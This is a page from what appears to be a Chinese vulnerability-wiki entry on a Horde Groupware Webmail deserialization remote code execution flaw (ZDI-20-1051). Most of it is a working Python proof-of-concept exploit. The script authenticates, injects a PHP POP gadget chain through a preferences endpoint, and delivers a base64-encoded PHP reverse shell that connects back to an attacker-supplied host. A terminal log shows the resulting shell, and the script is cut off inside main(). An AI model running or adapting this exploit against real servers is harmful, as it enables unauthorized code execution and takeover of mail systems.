<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Horde%20Groupware%20Webmail/Horde%20Groupware%20Webmail%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Horde Groupware Webmail 远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Horde Groupware Webmail \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Hoverfly/Hoverfly%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3simulation%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%28CVE-2024-45388%29/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Hoverfly/Hoverfly%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3simulation%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%28CVE-2024-45388%29/" class="btn btn-xs btn-link">
        Hoverfly系统接口simulation任意文件读取漏洞复现(CVE-2024-45388)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Hfs/Hfs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Hfs/Hfs%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Hfs 远程命令执行漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="horde-groupware-webmail">Horde Groupware Webmail 远程命令执行漏洞<a class="headerlink" href="#horde-groupware-webmail" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Horde Groupware
Webmail是美国Horde公司的一套基于浏览器的企业级通信套件。Horde Groupware
Webmail中存在代码注入漏洞。该漏洞源于外部输入数据构造代码段的过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段，修改网络系统或组件的预期的执行控制流。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><code><span class="n">saturn</span><span class="p">:</span><span class="o">~</span><span class="w"> </span><span class="n">mr_me</span><span class="o">$</span><span class="w"> </span><span class="o">./</span><span class="n">poc</span><span class="o">.</span><span class="n">py</span>
<span class="p">(</span><span class="o">+</span><span class="p">)</span><span class="w"> </span><span class="n">usage</span><span class="w"> </span><span class="o">./</span><span class="n">poc</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">path</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">user</span><span class="p">:</span><span class="k">pass</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">connectback</span><span class="p">:</span><span class="n">port</span><span class="o">&gt;</span>
<span class="p">(</span><span class="o">+</span><span class="p">)</span><span class="w"> </span><span class="n">eg</span><span class="p">:</span><span class="w"> </span><span class="o">./</span><span class="n">poc</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="mf">172.16</span><span class="o">.</span><span class="mf">175.148</span><span class="w"> </span><span class="o">/</span><span class="n">horde</span><span class="o">/</span><span class="w"> </span><span class="n">hordeuser</span><span class="p">:</span><span class="n">pass123</span><span class="w"> </span><span class="mf">172.16</span><span class="o">.</span><span class="mf">175.1</span><span class="p">:</span><span class="mi">1337</span>

<span class="n">saturn</span><span class="p">:</span><span class="o">~</span><span class="w"> </span><span class="n">mr_me</span><span class="o">$</span><span class="w"> </span><span class="o">./</span><span class="n">poc</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="mf">172.16</span><span class="o">.</span><span class="mf">175.148</span><span class="w"> </span><span class="o">/</span><span class="n">horde</span><span class="o">/</span><span class="w"> </span><span class="n">hordeuser</span><span class="p">:</span><span class="n">pass123</span><span class="w"> </span><span class="mf">172.16</span><span class="o">.</span><span class="mf">175.1</span><span class="p">:</span><span class="mi">1337</span>
<span class="p">(</span><span class="o">+</span><span class="p">)</span><span class="w"> </span><span class="n">targeting</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">172.16</span><span class="o">.</span><span class="mf">175.145</span><span class="o">/</span><span class="n">horde</span><span class="o">/</span>
<span class="p">(</span><span class="o">+</span><span class="p">)</span><span class="w"> </span><span class="n">obtained</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="n">iefankvohbl8og0mtaadm3efb6</span>
<span class="p">(</span><span class="o">+</span><span class="p">)</span><span class="w"> </span><span class="n">inserted</span><span class="w"> </span><span class="n">our</span><span class="w"> </span><span class="n">php</span><span class="w"> </span><span class="n">object</span>
<span class="p">(</span><span class="o">+</span><span class="p">)</span><span class="w"> </span><span class="n">triggering</span><span class="w"> </span><span class="n">deserialization</span><span class="o">...</span>
<span class="p">(</span><span class="o">+</span><span class="p">)</span><span class="w"> </span><span class="n">starting</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="mi">1337</span>
<span class="p">(</span><span class="o">+</span><span class="p">)</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="mf">172.16</span><span class="o">.</span><span class="mf">175.145</span>
<span class="p">(</span><span class="o">+</span><span class="p">)</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">thy</span><span class="w"> </span><span class="n">shell</span><span class="o">!</span>
<span class="n">id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span>
<span class="n">pwd</span>
<span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">horde</span><span class="o">/</span><span class="n">services</span>
<span class="n">uname</span><span class="w"> </span><span class="o">-</span><span class="n">a</span>
<span class="n">Linux</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="mf">4.9</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="n">amd64</span><span class="w"> </span><span class="c1">#1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 GNU/Linux</span>
<span class="n">exit</span>
<span class="o">***</span><span class="w"> </span><span class="n">Connection</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="k">remote</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="o">***</span>
<span class="p">(</span><span class="o">+</span><span class="p">)</span><span class="w"> </span><span class="n">repaired</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">target</span><span class="o">!</span>
</code></pre></div>

<blockquote>
<p>poc.py</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="sd">Horde Groupware Webmail Edition Sort sortpref Deserialization of Untrusted Data Remote Code Execution Vulnerability</span>

<span class="sd">Identifiers: ZDI-CAN-10436 / ZDI-20-1051</span>
<span class="sd">Found by ..: mr_me</span>
<span class="sd">Tested on .: Horde Groupware Webmail 5.2.22 (pear installation) on Debian 9 Stretch w/ Apache/2.4.25 &amp; PHP 7.0.33</span>

<span class="sd">Summary:</span>
<span class="sd">========</span>

<span class="sd">It&#39;s possible to reach a deserialization of untrusted data vulnerability within the constructor of the IMP_Prefs_Sort class. A low privileged authenticated attacker can leverage this to achieve remote code execution.</span>

<span class="sd">Example:</span>
<span class="sd">========</span>

<span class="sd">saturn:~ mr_me$ ./poc.py</span>
<span class="sd">(+) usage ./poc.py &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;</span>
<span class="sd">(+) eg: ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337</span>

<span class="sd">saturn:~ mr_me$ ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337</span>
<span class="sd">(+) targeting http://172.16.175.145/horde/</span>
<span class="sd">(+) obtained session iefankvohbl8og0mtaadm3efb6</span>
<span class="sd">(+) inserted our php object</span>
<span class="sd">(+) triggering deserialization...</span>
<span class="sd">(+) starting handler on port 1337</span>
<span class="sd">(+) connection from 172.16.175.145</span>
<span class="sd">(+) pop thy shell!</span>
<span class="sd">id</span>
<span class="sd">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
<span class="sd">pwd</span>
<span class="sd">/var/www/horde/services</span>
<span class="sd">uname -a</span>
<span class="sd">Linux target 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 GNU/Linux</span>
<span class="sd">exit</span>
<span class="sd">*** Connection closed by remote host ***</span>
<span class="sd">(+) repaired the target!</span>
<span class="sd">&quot;&quot;&quot;</span>


<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">telnetlib</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">threading</span><span class="w"> </span><span class="kn">import</span> <span class="n">Thread</span>

<span class="k">def</span><span class="w"> </span><span class="nf">rs</span><span class="p">(</span><span class="n">cbh</span><span class="p">,</span> <span class="n">cbp</span><span class="p">):</span>
    <span class="k">return</span> <span class="s2">&quot;&quot;&quot;@error_reporting(-1);</span>
<span class="s2">@set_time_limit(0); </span>
<span class="s2">@ignore_user_abort(1);</span>
<span class="s2">$dis=@ini_get(&#39;disable_functions&#39;);</span>
<span class="s2">if(!empty($dis)){</span>
<span class="s2">    $dis=preg_replace(&#39;/[, ]+/&#39;, &#39;,&#39;, $dis);</span>
<span class="s2">    $dis=explode(&#39;,&#39;, $dis);</span>
<span class="s2">    $dis=array_map(&#39;trim&#39;, $dis);</span>
<span class="s2">}else{</span>
<span class="s2">    $dis=array();</span>
<span class="s2">}</span>
<span class="s2">$ipaddr=&#39;</span><span class="si">%s</span><span class="s2">&#39;;</span>
<span class="s2">$port=</span><span class="si">%d</span><span class="s2">;</span>
<span class="s2">function PtdSlhY($c){</span>
<span class="s2">    global $dis; </span>
<span class="s2">    if (FALSE !== strpos(strtolower(PHP_OS), &#39;win&#39; )) {</span>
<span class="s2">        $c=$c.&quot; 2&gt;&amp;1</span><span class="se">\\</span><span class="s2">n&quot;;</span>
<span class="s2">    }</span>
<span class="s2">    ob_start();</span>
<span class="s2">    system($c);</span>
<span class="s2">    $o=ob_get_contents();</span>
<span class="s2">    ob_end_clean();</span>
<span class="s2">    if (strlen($o) === 0){</span>
<span class="s2">        $o = &quot;NULL&quot;;</span>
<span class="s2">    }</span>
<span class="s2">    return $o;</span>
<span class="s2">}</span>
<span class="s2">$nofuncs=&#39;no exec functions&#39;;</span>
<span class="s2">$s=@fsockopen(&quot;tcp://$ipaddr&quot;,$port);</span>
<span class="s2">while($c=fread($s,2048)){</span>
<span class="s2">    $out = &#39;&#39;;</span>
<span class="s2">    if(substr($c,0,3) == &#39;cd &#39;){</span>
<span class="s2">        chdir(substr($c,3,-1));</span>
<span class="s2">    }else if (substr($c,0,4) == &#39;quit&#39; || substr($c,0,4) == &#39;exit&#39;) {</span>
<span class="s2">        break;</span>
<span class="s2">    }else{</span>
<span class="s2">        $out=PtdSlhY(substr($c,0,-1));</span>
<span class="s2">        if($out===false){</span>
<span class="s2">            fwrite($s, $nofuncs);</span>
<span class="s2">            break;</span>
<span class="s2">        }</span>
<span class="s2">    }</span>
<span class="s2">    fwrite($s,$out);</span>
<span class="s2">}</span>
<span class="s2">fclose($s);&quot;&quot;&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">cbh</span><span class="p">,</span> <span class="n">cbp</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">get_session</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">usr</span><span class="p">,</span> <span class="n">pwd</span><span class="p">):</span>
    <span class="n">uri</span> <span class="o">=</span> <span class="s2">&quot;http://</span><span class="si">%s%s</span><span class="s2">login.php&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;login_post&quot;</span> <span class="p">:</span> <span class="mi">1337</span><span class="p">,</span>
        <span class="s2">&quot;horde_user&quot;</span> <span class="p">:</span> <span class="n">usr</span><span class="p">,</span>
        <span class="s2">&quot;horde_pass&quot;</span> <span class="p">:</span> <span class="n">pwd</span>
    <span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">uri</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">p</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">&quot;Horde=(.</span><span class="si">{26}</span><span class="s2">);&quot;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;set-cookie&#39;</span><span class="p">])</span>
    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">match</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;(-) failed to login&quot;</span>
    <span class="k">return</span> <span class="n">match</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="k">def</span><span class="w"> </span><span class="nf">trigger_deserialization</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot; Object instantiation to reach the deserialization &quot;&quot;&quot;</span>
    <span class="n">handlerthr</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">handler</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">port</span><span class="p">,))</span>
    <span class="n">handlerthr</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
    <span class="n">uri</span> <span class="o">=</span> <span class="s2">&quot;http://</span><span class="si">%s%s</span><span class="s2">services/ajax.php/imp/imple&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;imple&quot;</span> <span class="p">:</span> <span class="s2">&quot;IMP_Prefs_Sort&quot;</span><span class="p">,</span>
        <span class="s2">&quot;app&quot;</span> <span class="p">:</span> <span class="s2">&quot;imp&quot;</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">h</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&quot;cmd&quot;</span> <span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">rs</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="p">}</span>
    <span class="n">c</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&quot;Horde&quot;</span> <span class="p">:</span> <span class="n">s</span> <span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">uri</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">p</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">c</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">h</span><span class="p">)</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;horde_logout_token=(.*)&amp;&quot;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">assert</span> <span class="n">match</span><span class="p">,</span> <span class="s2">&quot;(-) failed to leak the horde_logout_token!&quot;</span>
    <span class="n">p</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">uri</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">p</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">c</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">h</span><span class="p">)</span>
    <span class="k">assert</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">,</span> <span class="s2">&quot;(-) failed to trigger deserialization!&quot;</span>

<span class="k">def</span><span class="w"> </span><span class="nf">get_pop</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot; An updated pop chain &quot;&quot;&quot;</span>
    <span class="n">pop</span>  <span class="o">=</span> <span class="s1">&#39;O:34:&quot;Horde_Kolab_Server_Decorator_Clean&quot;:2:{&#39;</span>
    <span class="n">pop</span> <span class="o">+=</span> <span class="s1">&#39;S:43:&quot;</span><span class="se">\\</span><span class="s1">00Horde_Kolab_Server_Decorator_Clean</span><span class="se">\\</span><span class="s1">00_server&quot;;O:20:&quot;Horde_Prefs_Identity&quot;:3:{&#39;</span>
    <span class="n">pop</span> <span class="o">+=</span> <span class="s1">&#39;S:9:&quot;</span><span class="se">\\</span><span class="s1">00*</span><span class="se">\\</span><span class="s1">00_prefs&quot;;O:11:&quot;Horde_Prefs&quot;:2:{&#39;</span>
    <span class="n">pop</span> <span class="o">+=</span> <span class="s1">&#39;S:8:&quot;</span><span class="se">\\</span><span class="s1">00*</span><span class="se">\\</span><span class="s1">00_opts&quot;;a:1:{&#39;</span>
    <span class="n">pop</span> <span class="o">+=</span> <span class="s1">&#39;s:12:&quot;sizecallback&quot;;a:2:{i:0;O:12:&quot;Horde_Config&quot;:1:{&#39;</span>
    <span class="n">pop</span> <span class="o">+=</span> <span class="s1">&#39;S:13:&quot;</span><span class="se">\\</span><span class="s1">00*</span><span class="se">\\</span><span class="s1">00_oldConfig&quot;;s:44:&quot;eval(base64_decode($_SERVER[HTTP_CMD]));die;&quot;;&#39;</span>
    <span class="n">pop</span> <span class="o">+=</span> <span class="s1">&#39;}i:1;s:13:&quot;readXMLConfig&quot;;}}&#39;</span>
    <span class="n">pop</span> <span class="o">+=</span> <span class="s1">&#39;S:10:&quot;</span><span class="se">\\</span><span class="s1">00*</span><span class="se">\\</span><span class="s1">00_scopes&quot;;a:1:{&#39;</span>
    <span class="n">pop</span> <span class="o">+=</span> <span class="s1">&#39;s:5:&quot;horde&quot;;C:17:&quot;Horde_Prefs_Scope&quot;:10:{[null,[1]]}}}&#39;</span>  <span class="c1"># implements Serializable using custom unserialize/serialize</span>
    <span class="n">pop</span> <span class="o">+=</span> <span class="s1">&#39;S:13:&quot;</span><span class="se">\\</span><span class="s1">00*</span><span class="se">\\</span><span class="s1">00_prefnames&quot;;a:1:{s:10:&quot;identities&quot;;i:0;}&#39;</span>
    <span class="n">pop</span> <span class="o">+=</span> <span class="s1">&#39;S:14:&quot;</span><span class="se">\\</span><span class="s1">00*</span><span class="se">\\</span><span class="s1">00_identities&quot;;a:1:{i:0;i:0;}}&#39;</span>             <span class="c1"># additional checks</span>
    <span class="n">pop</span> <span class="o">+=</span> <span class="s1">&#39;S:42:&quot;</span><span class="se">\\</span><span class="s1">00Horde_Kolab_Server_Decorator_Clean</span><span class="se">\\</span><span class="s1">00_added&quot;;a:1:{i:0;i:0;}}&#39;</span>
    <span class="k">return</span> <span class="n">pop</span>

<span class="k">def</span><span class="w"> </span><span class="nf">get_patch</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot; Our original array &quot;&quot;&quot;</span>
    <span class="n">patch</span>  <span class="o">=</span> <span class="s1">&#39;a:1:{&#39;</span>
    <span class="n">patch</span> <span class="o">+=</span> <span class="s1">&#39;s:5:&quot;INBOX&quot;;a:1:{&#39;</span>
    <span class="n">patch</span> <span class="o">+=</span> <span class="s1">&#39;s:1:&quot;b&quot;;i:6;&#39;</span>
    <span class="n">patch</span> <span class="o">+=</span> <span class="s1">&#39;}}&#39;</span>
    <span class="k">return</span> <span class="n">patch</span>

<span class="k">def</span><span class="w"> </span><span class="nf">set_pref</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">o</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot; A primitive that inserts a string into the database &quot;&quot;&quot;</span>
    <span class="n">uri</span> <span class="o">=</span> <span class="s2">&quot;http://</span><span class="si">%s%s</span><span class="s2">services/ajax.php/imp/setPrefValue&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;pref&quot;</span> <span class="p">:</span> <span class="n">k</span><span class="p">,</span>
        <span class="s2">&quot;value&quot;</span> <span class="p">:</span> <span class="n">o</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">c</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&quot;Horde&quot;</span> <span class="p">:</span> <span class="n">s</span> <span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">uri</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">p</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">c</span><span class="p">)</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;horde_logout_token=(.*)&amp;&quot;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">assert</span> <span class="n">match</span><span class="p">,</span> <span class="s2">&quot;(-) failed to leak the horde_logout_token!&quot;</span>
    <span class="n">p</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">uri</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">p</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">c</span><span class="p">)</span>
    <span class="k">assert</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">response</span><span class="se">\&quot;</span><span class="s2">:true&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">),</span> <span class="s2">&quot;(-) failed to set the preference!&quot;</span>

<span class="k">def</span><span class="w"> </span><span class="nf">handler</span><span class="p">(</span><span class="n">lport</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) starting handler on port </span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">lport</span><span class="p">)</span>
    <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s2">&quot;0.0.0.0&quot;</span><span class="p">,</span> <span class="n">lport</span><span class="p">))</span>
    <span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) connection from </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">conn</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) pop thy shell!&quot;</span><span class="p">)</span>
    <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>

<span class="k">def</span><span class="w"> </span><span class="nf">fix_path</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">p</span> <span class="o">==</span> <span class="s2">&quot;/&quot;</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">p</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">p</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">):</span>
        <span class="n">p</span> <span class="o">=</span> <span class="s2">&quot;/</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">p</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">p</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">):</span>
        <span class="n">p</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2">/&quot;</span> <span class="o">%</span> <span class="n">p</span>
    <span class="k">return</span> <span class="n">p</span>

<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">:</span>
